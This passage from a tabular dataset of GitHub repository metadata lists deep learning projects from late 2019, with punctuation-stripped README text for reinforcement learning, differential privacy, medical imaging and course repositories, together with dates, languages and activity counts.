bash python main py env PongNoFrameskip v4 play log LOGDIR weights Example 3 Control log save interval bash python main py env BreakoutNoFrameskip v4 train loginterval 100 saveweightinterval 1000 Results This implementation is guaranteed to work well for Atlantis Boxing Breakout and Pong Tensorboard summary is located at archive Tensorboard will show following information Average Q value Epsilon for exploration Latest 100 avg reward clipped Loss Reward clipped Test score Total frames bash tensorboard logdir archive Single RTX 2080 Ti is used for the results below Thanks to JKeun https github com JKeun for allowing his computation resources Atalntis Orange DQN Blue DDQN Reward atlantis assets atlantisresult png Q value atlantisQ assets DDQNQ value png We can see that DDQN s average Q value is suppressed compared to that of DQN BibTeX articlehasselt2015doubledqn abstract The popular Q learning algorithm is known to overestimate action values under certain conditions It was not previously known whether in practice such overestimations are common whether they harm performance and whether they can generally be prevented In this paper we answer all these questions affirmatively In particular we first show that the recent DQN algorithm which combines Q learning with a deep neural network suffers from substantial overestimations in some games in the Atari 2600 domain We then show that the idea behind the Double Q learning algorithm which was introduced in a tabular setting can be generalized to work with large scale function approximation We propose a specific adaptation to the DQN algorithm and show that the resulting algorithm not only reduces the observed overestimations as hypothesized but that this also leads to much better performance on several games added at 2019 11 18T11 40 13 000 0100 author van Hasselt Hado and Guez Arthur and Silver David biburl https www bibsonomy org bibtex 2c2bad4b4c5a34cb31a3f569c71e851ab jan hofmann1 description 1509 06461 Deep Reinforcement Learning with Double Q learning interhash d3061c37961afb78096e314854dd90bc intrahash c2bad4b4c5a34cb31a3f569c71e851ab keywords dqn q learning reinforcementlearning note cite arxiv 1509 06461Comment AAAI 2016 timestamp 2019 11 18T11 40 13 000 0100 title Deep Reinforcement Learning with Double Q learning url http arxiv org abs 1509 06461 year 2015 Author Jihoon Kim jihoonerd https github com jihoonerd,2019-11-19T10:29:59Z,2019-11-26T01:37:06Z,Python,jihoonerd,User,1,1,1,6,master,jihoonerd,1,0,0,0,0,0,0
woodyx218,Deep-Learning-with-GDP,n/a,What is this This project contains scripts to reproduce experiments from the paper Deep Learning with Gaussian Differential Privacy https arxiv org abs 1911 11607 by Zhiqi Bu Jinshuo Dong Weijie Su and Qi Long The Problem of Interest Deep learning models are often trained on datasets that contain sensitive information such as individuals shopping transactions personal contacts and medical records Many differential privacy definitions arise for the study of trade off between models performance and privacy guarantees We consider a recently proposed privacy definition termed f differential privacy https arxiv org abs 1905 02383 for a refined privacy analysis of training neural networks Description of Files You need to install Tensorflow python package privacy https github com tensorflow privacy to run the following codes Four datasets mnisttutorial py mnisttutorial py private CNN on MNIST adulttutorial py adulttutorial py private NN on Adult data imdbtutorial py imdbtutorial py private NN on IMDB reviews movielenstutorial py movielenstutorial py private NN on MovieLens 1M Privacy Accountants privacyaccountants py The script computes the moments accountant MA central limit theorem CLT and dual relation Dual between delta epsilon mu Plots mnistplot py This script together with the saved pickles can easily reproduce the figures in the paper,2019-11-24T20:01:40Z,2019-12-02T00:55:10Z,Python,woodyx218,User,1,1,2,11,master,woodyx218,1,0,0,0,0,0,0
tmfdk333-ai-study,deep-learning-from-scratch,n/a,http www hanbit co kr store books look php pcode B8475831198 octocat WegraLee deep learning from scratch https github com WegraLee deep learning from scratch,2019-11-11T10:19:49Z,2019-11-13T13:53:33Z,n/a,tmfdk333-ai-study,Organization,1,1,0,2,master,tmfdk333,1,0,0,0,0,0,0
ddrevicky,deep-learning-uncertainty,n/a,Deep Learning Model Uncertainty in Medical Image Analysis This repository contains the code for my Master s Thesis full text https www vutbr cz wwwbase zavpracesouborverejne php fileid 198231 which deals with augmenting deep learning models with the ability to provide uncertainty estimates along with their predictions We evaluate several uncertainty measures on a landmark localization task using a dataset of X ray cephalograms A short summary of the work follows please see the full text if you d like more details https github com ddrevicky deep learning uncertainty blob master images predictionsandestimates png Motivation Deep convolutional neural networks CNNs achieve super human results in image analysis but their outputs lack reliable information about the uncertainty of their predictions which prevents their wide spread adaptation in medicine In this work we Propose and train a CNN for the task of automatic cephalometric landmark localization on skull X rays This is usually done by a dentist manually and is a time consuming and tedious process Design and implement uncertainty metrics accompanying the trained models which are able to provide estimates of how certain the network is of its predictions i e how much we should trust the predicted landmark positions Solution Landmark Localization CNN was trained on a dataset 1 of 200 X ray cephalograms annotated with 19 landmark positions Training done via heatmap regression annotated landmark location is used to create a 2D heatmap with a Gaussian spike at that location https github com ddrevicky deep learning uncertainty blob master images landmarksolution png Solution Uncertainty Measures We proposed three models with corresponding uncertainty measures 1 Baseline is a CNN based on U Net 2 It uses the value of the maximum heatmap activation as a measure of how uncertain the CNN is with its prediction we assume lower values indicate higher uncertainty 2 Ensemble is an ensemble model of 15 Baseline models based on the work of Lakshminarayanan et al 3 3 MC Dropout is a CNN based on U Net but additionally contains dropout layers which randomly remove some weights from the network both during training and evaluation making the CNN stochastic so that multiple evaluations of the same image do not produce the exact same output Based on the research by Gal et al 4 For both Ensemble and MC Dropout models the prediction mean is used as the final predicted landmark position and the prediction variance of the ensemble members and Monte Carlo samples respectively as the uncertainty measure We assume that as variance increases so does the models uncertainty https github com ddrevicky deep learning uncertainty blob master images models png Experiment 1 Can Uncertainty Measures Detect Skull Rotation https github com ddrevicky deep learning uncertainty blob master images correlationskullrotation png https github com ddrevicky deep learning uncertainty blob master images skullrotation png Experiment 2 Can Uncertainty Measures Detect Deformed Data https github com ddrevicky deep learning uncertainty blob master images correlationdistorted png https github com ddrevicky deep learning uncertainty blob master images elasticdistortion png Conclusion Models achieve performance close to state of the art on the studied landmark localization task Uncertainty measures were able to reliably detect data unsuitable for automatic evaluation References 1 2016 Wang et al A benchmark for comparison of dental radiography analysis algorithms 2 2015 Ronneberger O Fischer P Brox T U Net Convolutional Networks for Biomedical Image Segmentation 3 2017 Lakshminarayanan et al Simple and Scalable Predictive Uncertainty Estimation using Deep Ensembles 4 2016 Gal Y Ghahramani Z Dropout As a Bayesian Approximation Usage Preprocessing the dataset Follow the preparedataset ipynb notebook to download and preprocess the data Model evaluation Use the following scripts to evaluate the performance of the models on the landmark localization task Ensemble and Baseline To train 15 independent Baseline models to form an Ensmeble as described in the thesis run trainensemble sh To generate predictions for all ensemble members and then evaluate the full Ensemble run evalensemble sh Once this is done and the predictions are generated you can also evaluate a single Baseline member by running evalbaseline sh MC Dropout Run trainmcdropout sh to train an MC Dropout model as described in the thesis To first generate predictions on the test set using 15 samples and then evaluate the performance of the model run evalmcdropout sh,2019-11-12T10:07:48Z,2019-11-13T12:16:51Z,Python,ddrevicky,User,1,1,0,10,master,ddrevicky,1,0,0,0,0,0,0
huckiyang,awesome-deep-causal-learning,n/a,awesome deep causal learning Awesome https awesome re badge svg https awesome re A curated list of awesome deep causal learning methods when causaliy deep meets deep neural network Inspired by awesome deep vision https github com kjw0612 awesome deep vision awesome adversarial machine learning https github com yenchenlin awesome adversarial machine learning awesome deep learning papers https github com terryum awesome deep learning papers awesome architecture search https github com markdtw awesome architecture search and awesome self supervised learning https github com jason718 awesome self supervised learning Learning to inference and disentangle is the next big challenge of Deep Learning Welcome to commit and pull request NeurIPS One shot learning by inverting a compositional causal process http papers nips cc paper 5128 one shot learning by inverting a compositional causal process NeurIPS 2013 Causal bandits Learning good interventions via causal inference http papers nips cc paper 6195 causal bandits learning good interventions via causal inference NeurIPS 2016 CVPR Discovering causal signals in images http openaccess thecvf com contentcvpr2017 html Lopez PazDiscoveringCausalSignalsCVPR2017paper html ICML Towards a learning theory of cause effect inference http proceedings mlr press v37 lopez paz15 pdf ICML 2015 Learning granger causality for hawkes processes http proceedings mlr press v48 xuc16 pdf ICML 2016 AAAI Granger causal attentive mixtures of experts Learning important features with neural networks https wvvw aaai org ojs index php AAAI article download 4412 4290 ICIP Causal graph based video segmentation https ieeexplore ieee org abstract document 6738875 Couprie C Farabet C LeCun Y Najman L 2013 September Causal graph based video segmentation In 2013 IEEE International Conference on Image Processing pp 4249 4253 IEEE When Causal Intervention Meets Adversarial Examples and Image Masking for Deep Neural Networks https ieeexplore ieee org abstract document 8803554 Contact C H Huck Yang Georgia Tech,2019-11-26T01:18:56Z,2019-11-28T00:26:47Z,n/a,huckiyang,User,1,1,0,6,master,huckiyang,1,0,0,0,0,0,0
AT1693,Deep_Learning_basics,n/a,DEEP LEARNING BASICS,2019-12-03T04:38:56Z,2019-12-05T19:14:09Z,Jupyter Notebook,AT1693,User,1,1,0,51,master,AT1693,1,0,0,0,0,0,0
sfq121,self-Deep-learning,n/a,self Deep learning 19,2019-12-11T04:51:04Z,2019-12-11T04:56:04Z,n/a,sfq121,User,1,1,0,2,master,sfq121,1,0,0,0,0,0,0
dlathina,Introduction-to-Deep-Learning,n/a,,2019-11-02T13:19:46Z,2019-12-09T06:01:37Z,Jupyter Notebook,dlathina,User,1,1,0,9,master,dlathina,1,0,0,0,0,0,0
harshablast,deep-learning-demystified-frontend,n/a,,2019-11-29T17:15:02Z,2019-12-04T23:50:54Z,HTML,harshablast,User,1,1,0,20,master,harshablast,1,0,0,0,0,0,0
seungmin-h,deep-learning_accident-prediction,n/a,,2019-12-04T07:01:57Z,2019-12-06T07:22:56Z,Python,seungmin-h,User,1,1,0,3,master,seungmin-h,1,0,0,0,0,0,0
bertravacca,Implicit-Deep-Learning,n/a,Implicit Deep Learning Implementation of Implicit Deep Learning on Matlab,2019-11-07T01:19:51Z,2019-12-10T19:23:52Z,MATLAB,bertravacca,User,1,1,0,39,master,bertravacca,1,0,0,0,0,0,0
bcrafton,icsrl-deep-learning,n/a,Deep Learning Templates This repository contains template code for the following deep learning tasks 1 Image Classification 2 Object Detection 3 Semantic Segmentation 4 Reinforcement Learning Proximal Policy Optimization Getting Started It is intended to run on our lab servers 1 icsrl exxact1 ece gatech edu 2 icsrl srv2 ece gatech edu Lastly there are two things you need to configure before running 1 Dataset Path 2 Transfer Learning weights Both of these are available on the server and can be configured by setting the exxact flag in the script exxact 1 implies you are working on the exxact server exxact 0 implies you are working on the icsrl2 server Affiliation Georgia Institute of Technology ICSRL http icsrl ece gatech edu Alt text READMEsrc icsrl png raw true Title License This project is licensed under the MIT License see the LICENSE md LICENSE md file for details,2019-11-20T14:24:08Z,2019-11-22T22:04:41Z,Python,bcrafton,User,1,1,0,24,master,bcrafton,1,0,0,0,0,0,0
Gaurav14cs17,Deep-learning-from-scratch,n/a,,2019-11-24T13:01:45Z,2019-11-27T17:06:42Z,Jupyter Notebook,Gaurav14cs17,User,1,1,0,14,master,Gaurav14cs17,1,0,0,0,0,0,0
ramanakothi,Deep-Reinforcement-Learning,n/a,,2019-11-24T17:37:50Z,2019-12-09T17:54:22Z,Jupyter Notebook,ramanakothi,User,1,1,0,29,master,ramanakothi,1,0,0,0,0,0,0
skaan,deep-learning-project,n/a,deep learning project Repository for group project in Deep Learning lecture,2019-11-12T15:05:32Z,2019-12-05T20:10:13Z,Jupyter Notebook,skaan,User,1,1,0,7,master,cslavenc#skaan,2,0,0,0,0,0,0
jnphilipp,deep_learning-ingredients,n/a,,2019-11-19T12:24:39Z,2019-12-08T19:49:52Z,Python,jnphilipp,User,1,1,0,58,master,jnphilipp,1,0,0,0,0,0,0
TaeunKwon,Deep_learning_finalproject_Symmetry,n/a,DeeplearningfinalprojectSymmetry Dataset is on Google Drive https drive google com file d 1AfLzxdGlu3oMyqAhCisUbIapofAu view usp sharing batch size of autoencoder 100 Auto Encoder Structure Encoder after conv1 100 1350 2 Encoder after maxpool1 100 675 2 Encoder after Dense1 100 800 Encoder after Dense2 100 400 Encoder after Dense3 100 100 Encoder output 100 10 Encoder after Dense1 100 400 Encoder after Dense2 100 800 Encoder after Dense3 100 1300 Decoder after upsample1 100 1350 2 Decoder after deconv1 100 2700 1 batch size of clustering 20000 Trainable variables npulses x ncluster encoder parameters,2019-11-24T21:53:29Z,2019-12-11T11:41:35Z,Python,TaeunKwon,User,1,1,1,71,master,TaeunKwon#jeannebang,2,0,0,0,0,0,17
christiankolding,dtu-02456-deep-learning,awd-lstm#deep-learning#lstm#nlp,DTU 02456 Deep Learning course project The purpose of the project is to implement this paper https arxiv org pdf 1708 02182v1 pdf and use the network to generate text Setup is initially based on this https github com pytorch examples tree master wordlanguagemodel PyTorch language model example See more info about the course here https kurser dtu dk course 02456 How to run The project is developed using Python 3 6 and PyTorch 0 4 Training a language model is done in LanguageModel ipynb LanguageModel ipynb and text generation can be done in either GenerateText ipynb GenerateText ipynb for multinomial sampling or GenerateTextBeamSearch ipynb GenerateTextBeamSearch ipynb for beam search Choosing the dataset is done in the notebooks Here you can also choose which configuration to use This points to an entry in config yml config yml that can easily be edited or a new configuration can be added Models are saved using the name specified in config yml config yml every time a new best validation perplexity is reached This allows easy loading for text generation for example,2019-11-11T11:07:07Z,2019-12-12T06:48:37Z,Jupyter Notebook,christiankolding,User,1,1,1,38,master,christiankolding#LarsBryld,2,0,0,0,0,0,0
gb08,Deep_learning_with_Colab,n/a,Deep Learning with Google Colab This repository contains the Deep Learning Notebooks can run directly with google colab,2019-11-30T13:34:37Z,2019-12-10T17:46:59Z,Jupyter Notebook,gb08,User,1,1,0,8,master,gb08,1,0,0,0,0,0,0
krantirk,Grokking-Deep-Learning,n/a,Grokking Deep Learning Run on FloydHub https static floydhub com button button small svg https floydhub com run This repository accompanies the book Grokking Deep Learning available here https manning com books grokking deep learning aaid grokkingdl abid 32715258 Grokking Deep Learning Also the coupon code trask40 is good for a 40 discount Chapter 3 Forward Propagation Intro to Neural Prediction https github com iamtrask Grokking Deep Learning blob master Chapter3 20 20 20Forward 20Propagation 20 20Intro 20to 20Neural 20Prediction ipynb Chapter 4 Gradient Descent Into to Neural Learning https github com iamtrask Grokking Deep Learning blob master Chapter4 20 20Gradient 20Descent 20 20Intro 20to 20Neural 20Learning ipynb Chapter 5 Generalizing Gradient Descent Learning Multiple Weights at a Time https github com iamtrask Grokking Deep Learning blob master Chapter5 20 20Generalizing 20Gradient 20Descent 20 20Learning 20Multiple 20Weights 20at 20a 20Time ipynb Chapter 6 Intro to Backpropagation Building your first DEEP Neural Network https github com iamtrask Grokking Deep Learning blob master Chapter6 20 20Intro 20to 20Backpropagation 20 20Building 20Your 20First 20DEEP 20Neural 20Network ipynb Chapter 8 Intro to Regularization Learning Signal and Ignoring Noise https github com iamtrask Grokking Deep Learning blob master Chapter8 20 20Intro 20to 20Regularization 20 20Learning 20Signal 20and 20Ignoring 20Noise ipynb Chapter 9 Intro to Activation Functions Learning to Model Probabilities https github com iamtrask Grokking Deep Learning blob master Chapter9 20 20Intro 20to 20Activation 20Functions 20 20Modeling 20Probabilities ipynb Chapter 10 Intro to Convolutional Neural Networks Learning Edges and Corners https github com iamtrask Grokking Deep Learning blob master Chapter10 20 20Intro 20to 20Convolutional 20Neural 20Networks 20 20Learning 20Edges 20and 20Corners ipynb Chapter 11 Intro to Word Embeddings Neural Networks which Understand Language https github com iamtrask Grokking Deep Learning blob master Chapter11 20 20Intro 20to 20Word 20Embeddings 20 20Neural 20Networks 20that 20Understand 20Language ipynb Chapter 12 Intro to Recurrence RNNs Predicting the Next Word https github com iamtrask Grokking Deep Learning blob master Chapter12 20 20Intro 20to 20Recurrence 20 20Predicting 20the 20Next 20Word ipynb Chapter 13 Intro to Automatic Differentiation https github com iamtrask Grokking Deep Learning blob master Chapter13 20 20Intro 20to 20Automatic 20Differentiation 20 20Let s 20Build 20A 20Deep 20Learning 20Framework ipynb Chapter 14 Exploding Gradients Example https github com iamtrask Grokking Deep Learning blob master Chapter14 20 20Exploding 20Gradients 20Examples ipynb Chapter 14 Intro to LSTMs https github com iamtrask Grokking Deep Learning blob master Chapter14 20 20Intro 20to 20LSTMs 20 20Learn 20to 20Write 20Like 20Shakespeare ipynb Chapter 14 Intro to LSTMs Part 2 https github com iamtrask Grokking Deep Learning blob master Chapter14 20 20Intro 20to 20LSTMs 20 20Part 202 20 20Learn 20to 20Write 20Like 20Shakespeare ipynb Chapter 15 Intro to Federated Learning https github com iamtrask Grokking Deep Learning blob master Chapter15 20 20Intro 20to 20Federated 20Learning 20 20Deep 20Learning 20on 20Unseen 20Data ipynb,2019-12-01T08:51:41Z,2019-12-02T18:24:40Z,Jupyter Notebook,krantirk,User,1,1,0,32,master,iamtrask#4mber#whatrocks#joergrosenkranz,4,0,0,0,0,0,0
yxchspring,deep_ensemble_learning,n/a,deepensemblelearning Deep Ensemble Learning for Human Action Recognition in Still Images The code is provided by Xiangchun Yu Email yxchspring0209 foxmail com Data November 08 2019 Step1 Please extract the compressed file to the current folder Such as deepensemblelearning ActionForCNN train Step2 Train the VGG16 VGG16NCNN VGG19 VGG19NCNN ResNet50 ResNet50NCNN models using the following python scripts Main1VGG16 py Main1VGG16NCNN py Main1VGG19 py Main1VGG19NCNN py Main3ResNet50 py Main3ResNet50NCNN py And use the Main4EvaluateResults py test the results of the models mentioned above Step3 Train the DELWO1 DELWO3 models using the following python scripts Main5DELWO1 py Main5DELWO2 py Main5DELWO3 py And use the Main6EvaluateResultsforDELWOs py test the results of the models mentioned above Step4 Evaluate the models performance using DELVS1 DELVS3 using the following python scripts Main7DELVS1 py Main7DELVS2 py Main7DELVS3 py Note The final results will be obtained directly using the above python scripts,2019-11-08T08:07:24Z,2019-12-09T13:36:45Z,Python,yxchspring,User,1,1,0,6,master,yxchspring,1,0,0,0,0,0,0
MLAlg,Deep-Learning--Basic-Advanced,n/a,Deep Learning Solutions Some experiments during the first year of master Convolutional Neural Networks dataset hoda persian alphabet Transfer Learning Different Models of AutoEncoders sparce AE dataset MNIST digits,2019-11-06T02:04:23Z,2019-11-10T13:29:19Z,Jupyter Notebook,MLAlg,User,1,1,0,51,master,MLAlg,1,0,0,0,0,0,0
meetshrihari,Deep_Learning_Shri,n/a,,2019-12-03T22:35:28Z,2019-12-03T22:57:24Z,Python,meetshrihari,User,1,1,0,1,master,meetshrihari,1,0,0,0,0,0,0
AhmedMnsour,Deep-Learning-With-pytorch,n/a,Deep Learning With pytorch This repo contains notebooks for various deep lerning tasks implemented in pytorch,2019-11-17T15:52:04Z,2019-12-05T22:35:16Z,Jupyter Notebook,AhmedMnsour,User,1,1,0,3,master,AhmedMnsour,1,0,0,0,0,0,0
rajeevranjan732,Deep-Learning-Specialization,n/a,Deep Learning Specialization Solved Excercises of Coursera Deep Learning Course https www coursera org specializations deep learning,2019-12-07T17:51:02Z,2019-12-10T09:32:15Z,Jupyter Notebook,rajeevranjan732,User,1,1,0,8,master,rajeevuipath#rajeevranjan732,2,0,0,0,0,0,0
S-Mann,deep-reinforcement-learning,n/a,deep reinforcement learning Implementing deep reinforcement learning for a game This is for educational purposes only I have implemented a deep reinforcement learning agent that plays a game in JavaScript using tensorflow and processing libraries I am inspired by Daniel Shiffman https natureofcode com book I have learnt everything I know about machine learning from Daniel Shiffman,2019-11-28T15:05:57Z,2019-11-28T15:18:24Z,JavaScript,S-Mann,User,1,1,0,3,master,S-Mann,1,0,0,0,0,0,0
wforeros,deep-learning-eeg,n/a,Deep Learning aplicado a seales EEG En este repositorio se encuentran los diferentes archivos empleados para la implementacin de un modelo de deep learning encargado de clasificar seales EEG en dos grandes categoras Emoticn Cara Real Esto teniendo una seal EEG resultado de usar como estmulo uno de estos tipos a la entrada del modelo pre procesada Scripts del repositorio datareview py Se encarga de hacer la revisin del data set revisa cada archivo y en caso de que no cuente con las muestras que debera tener ese archivo ser includo en un diccionario este es mostrado al final del script deepeegcore py En este script se encuentra el ncleo de este proyecto es utilizado en todos los procesos se recomienda revisar cada una de las funciones pues cuentan co su respectivo docstring definiendo que son cada uno de los parmetros funcionamiento y qu retorna IMPORTANTE Este script contiene variables correspondientes al nombre asignado a cada carpeta de sets rutas que dependern de cada computador etiquetas entre otras stas son usadas a lo largo del proyecto por tanto es necesario actualizarlas de forma manual en el cdigo para su correcto funcionamiento loadmodels py Script no finalizado pero includo en el repositorio no se usa en ninguno de los scripts models py Tiene funciones para crear los modelos clasificador y autoencoder256 slo puede ser entrenado con datos de 256 muestras este ltimo an en desarrollo preprocessdata py En este script se realizan las siguientes tareas Elimar canales FP1 y FP2 usados para EOG normalizacin de los datos almacenamiento en archivos terminados en epo fif y divisin en carpetas de entrenamiento y test con porcentaje por defecto de 80 y 20 respectivamente La ecuacin empleada para normalizar fue canal Donde Promedio Desviacin estndar training py Lectura de datos fif asignacin de categora para cada epoch separacin en arreglos de numpy X contiene epochs y Y contiene labels one hot creacin del modelo con la ayuda del script models py entrenamiento del modelo y almacenamiento del mismo Dependencias NumPy https numpy org NumPy mne https mne tools stable install index html mne Scikit Learn https scikit learn org stable install html Scikit Learn Keras https keras io installation Keras TensorFlow https www tensorflow org install pip TensorFlow Recomendaciones Se recomienda para trabajos a futuro desarrollar el modelo auto encoder haciendo una ruptura del modelo antes de la capa de aplanado Flatten esto con el fin de incluir las capas inversas que se tienen hasta ese punto e inicialmente lograr recrear la seal original al modelo que no ser realmente igual pero si conservar la estructura y no presentar grandes variaciones entre los diferentes puntos consiguiendo as una reconstruccin con menor ruido logrando una estructura definida y probada del modelo CAE convolutional auto encoder Es posible usar un modelo CAE como herramienta de visualizacin de las zonas en las que se presenta mayor actividad activacin en el cerebro todo esto acorde a la seal EEG presentada a la entrada del modelo,2019-12-06T05:08:33Z,2019-12-06T08:31:17Z,Python,wforeros,User,1,1,0,27,master,wforeros,1,0,1,0,0,0,0
shadab4150,Deep-Learning-Classifiers,n/a,Deep Learning Classifiers Deep Learning Classifiers that I built using google images through what I learned from jeremy howard s fast ai course,2019-11-26T19:39:01Z,2019-12-08T14:10:12Z,Jupyter Notebook,shadab4150,User,1,1,0,8,master,shadab4150,1,0,0,0,0,0,0
kasim95,Deep_Learning-Flappy_Bird,n/a,DeepLearning FlappyBird Kunal Amos Matthews amos m2345 csu fullerton edu Erik Lipsky eriklipsky csu fullerton edu Allen Mrazek amrazek csu fullerton edu Mohammed Kasim Panjri kasimp csu fullerton edu,2019-11-18T04:52:10Z,2019-12-10T10:06:16Z,Python,kasim95,User,1,1,0,29,master,kasim95#amrazek#TheAntiLuck,3,0,0,0,0,0,0
JuanPabloMF,deep-learning-platzi,n/a,Curso de Deep Learning con Pytorch https i imgur com Mzyp6li jpg Este repositorio contiene los materiales escritos del curso de Platzi Deep Learning con Pytorch https platzi com cursos deep learning En el encontraras Notebooks Clases Folder que contiene los notebooks ligados a cada video del curso Slides Aqui encontraras en formato PDF los slides presentados en el curso DeepLearningConPytorch ipynb Notebook con todo el codigo del curso Este contiene algunos fixes y mejoras asi que te podras basar en el como referencia de codigo si tienes algun problema El curso se articula en 4 partes 1 Introduccion al Deep Learning 2 API de Pytorch Objetos modulos e interfaces esenciales 3 Como aprenden las Redes Neuronales Profundas 4 Proyecto practico Transferencia de estilo con CycleGAN La parte 2 es codigo muy hands on mientras que la parte 3 aporta elementos teoricos de aprendizaje pero de manera pragmatica La parte 4 es un proyecto practico que corresponde a la implementacion de una red moderna y compleja para lograr darle un look de verano a imagenes de invierno CycleGAN es muy versatil y en las slides podras ver todas las otras aplicaciones que puedes hacer con esta red Adicionalmente ire agregando algunos materiales complementarios que te pueden ayudar en tu camino a ser experto en Deep Learning A seguir aprendiendo,2019-12-10T17:06:56Z,2019-12-11T21:52:05Z,Jupyter Notebook,JuanPabloMF,User,2,1,1,4,master,JuanPabloMF,1,0,0,0,0,0,0
jorditorresBCN,python-deep-learning,n/a,,2019-12-10T19:33:26Z,2019-12-13T09:53:08Z,n/a,jorditorresBCN,User,1,1,0,0,master,,0,0,0,0,0,0,0
mzouink,deep-reinforcement-learning-starter,n/a,Image References image1 https user images githubusercontent com 10624937 42135602 b0335606 7d12 11e8 8689 dd1cf9fa11a9 gif Trained Agents image2 https user images githubusercontent com 10624937 42386929 76f671f0 8106 11e8 9376 f17da2ae852e png Kernel Deep Reinforcement Learning Nanodegree Trained Agents image1 This repository contains material related to Udacity s Deep Reinforcement Learning Nanodegree https www udacity com course deep reinforcement learning nanodegree nd893 program Table of Contents Tutorials The tutorials lead you through implementing various algorithms in reinforcement learning All of the code is in PyTorch v0 4 and Python 3 Dynamic Programming https github com udacity deep reinforcement learning tree master dynamic programming Implement Dynamic Programming algorithms such as Policy Evaluation Policy Improvement Policy Iteration and Value Iteration Monte Carlo https github com udacity deep reinforcement learning tree master monte carlo Implement Monte Carlo methods for prediction and control Temporal Difference https github com udacity deep reinforcement learning tree master temporal difference Implement Temporal Difference methods such as Sarsa Q Learning and Expected Sarsa Discretization https github com udacity deep reinforcement learning tree master discretization Learn how to discretize continuous state spaces and solve the Mountain Car environment Tile Coding https github com udacity deep reinforcement learning tree master tile coding Implement a method for discretizing continuous state spaces that enables better generalization Deep Q Network https github com udacity deep reinforcement learning tree master dqn Explore how to use a Deep Q Network DQN to navigate a space vehicle without crashing Robotics https github com dusty nv jetson reinforcement Use a C API to train reinforcement learning agents from virtual robotic simulation in 3D External link Hill Climbing https github com udacity deep reinforcement learning tree master hill climbing Use hill climbing with adaptive noise scaling to balance a pole on a moving cart Cross Entropy Method https github com udacity deep reinforcement learning tree master cross entropy Use the cross entropy method to train a car to navigate a steep hill REINFORCE https github com udacity deep reinforcement learning tree master reinforce Learn how to use Monte Carlo Policy Gradients to solve a classic control task Proximal Policy Optimization Explore how to use Proximal Policy Optimization PPO to solve a classic reinforcement learning task Coming soon Deep Deterministic Policy Gradients Explore how to use Deep Deterministic Policy Gradients DDPG with OpenAI Gym environments Pendulum https github com udacity deep reinforcement learning tree master ddpg pendulum Use OpenAI Gym s Pendulum environment BipedalWalker https github com udacity deep reinforcement learning tree master ddpg bipedal Use OpenAI Gym s BipedalWalker environment Finance https github com udacity deep reinforcement learning tree master finance Train an agent to discover optimal trading strategies Labs Projects The labs and projects can be found below All of the projects use rich simulation environments from Unity ML Agents https github com Unity Technologies ml agents In the Deep Reinforcement Learning Nanodegree https www udacity com course deep reinforcement learning nanodegree nd893 program you will receive a review of your project These reviews are meant to give you personalized feedback and to tell you what can be improved in your code The Taxi Problem https github com udacity deep reinforcement learning tree master lab taxi In this lab you will train a taxi to pick up and drop off passengers Navigation https github com udacity deep reinforcement learning tree master p1navigation In the first project you will train an agent to collect yellow bananas while avoiding blue bananas Continuous Control https github com udacity deep reinforcement learning tree master p2continuous control In the second project you will train an robotic arm to reach target locations Collaboration and Competition https github com udacity deep reinforcement learning tree master p3collab compet In the third project you will train a pair of agents to play tennis Resources Cheatsheet https github com udacity deep reinforcement learning blob master cheatsheet You are encouraged to use this PDF file https github com udacity deep reinforcement learning blob master cheatsheet cheatsheet pdf to guide your study of reinforcement learning OpenAI Gym Benchmarks Classic Control Acrobot v1 with Tile Coding https github com udacity deep reinforcement learning blob master tile coding TileCodingSolution ipynb and Q Learning Cartpole v0 with Hill Climbing https github com udacity deep reinforcement learning blob master hill climbing HillClimbing ipynb solved in 13 episodes Cartpole v0 with REINFORCE https github com udacity deep reinforcement learning blob master reinforce REINFORCE ipynb solved in 691 episodes MountainCarContinuous v0 with Cross Entropy Method https github com udacity deep reinforcement learning blob master cross entropy CEM ipynb solved in 47 iterations MountainCar v0 with Uniform Grid Discretization https github com udacity deep reinforcement learning blob master discretization DiscretizationSolution ipynb and Q Learning solved in 50000 episodes Pendulum v0 with Deep Deterministic Policy Gradients DDPG https github com udacity deep reinforcement learning blob master ddpg pendulum DDPG ipynb Box2d BipedalWalker v2 with Deep Deterministic Policy Gradients DDPG https github com udacity deep reinforcement learning blob master ddpg bipedal DDPG ipynb CarRacing v0 with Deep Q Networks DQN Coming soon LunarLander v2 with Deep Q Networks DQN https github com udacity deep reinforcement learning blob master dqn solution DeepQNetworkSolution ipynb solved in 1504 episodes Toy Text FrozenLake v0 with Dynamic Programming https github com udacity deep reinforcement learning blob master dynamic programming DynamicProgrammingSolution ipynb Blackjack v0 with Monte Carlo Methods https github com udacity deep reinforcement learning blob master monte carlo MonteCarloSolution ipynb CliffWalking v0 with Temporal Difference Methods https github com udacity deep reinforcement learning blob master temporal difference TemporalDifferenceSolution ipynb Dependencies To set up your python environment to run the code in this repository follow the instructions below 1 Create and activate a new environment with Python 3 6 Linux or Mac bash conda create name drlnd python 3 6 source activate drlnd Windows bash conda create name drlnd python 3 6 activate drlnd 2 Follow the instructions in this repository https github com openai gym to perform a minimal install of OpenAI gym Next install the classic control environment group by following the instructions here https github com openai gym classic control Then install the box2d environment group by following the instructions here https github com openai gym box2d 3 Clone the repository if you haven t already and navigate to the python folder Then install several dependencies bash git clone https github com udacity deep reinforcement learning git cd deep reinforcement learning python pip install 4 Create an IPython kernel http ipython readthedocs io en stable install kernelinstall html for the drlnd environment bash python m ipykernel install user name drlnd display name drlnd 5 Before running code in a notebook change the kernel to match the drlnd environment by using the drop down Kernel menu Kernel image2 Want to learn more Come learn with us in the Deep Reinforcement Learning Nanodegree program at Udacity,2019-11-17T06:47:08Z,2019-12-14T11:19:41Z,Jupyter Notebook,mzouink,User,1,1,0,25,master,juanudacity#mzouink#alexisbcook,3,0,0,1,0,1,1
nithyadurai87,deep_learning_book_code,n/a,deeplearningbookcode,2019-12-14T16:33:51Z,2019-12-14T17:23:52Z,Python,nithyadurai87,User,1,1,0,1,master,nithyadurai87,1,0,0,0,0,0,0
kazzastic,BreastCancer-Deep-Learning,breastcancer-classification#computer-vision#convolutional-neural-networks#ddsm#deeplearning#keras#mamograms#tensorflow,BreastCancer Deep Learning Dataset wget http data csail mit edu places medical data ddsmpatches tar gz wget http data csail mit edu places medical data ddsmlabels tar gz wget http data csail mit edu places medical data ddsmraw tar gz wget http data csail mit edu places medical data ddsmrawimagelists tar gz wget http data csail mit edu places medical data ddsmmasks tar gz,2019-11-17T09:14:30Z,2019-12-15T00:09:31Z,Jupyter Notebook,kazzastic,User,1,1,0,20,master,kazzastic,1,0,0,0,0,0,0
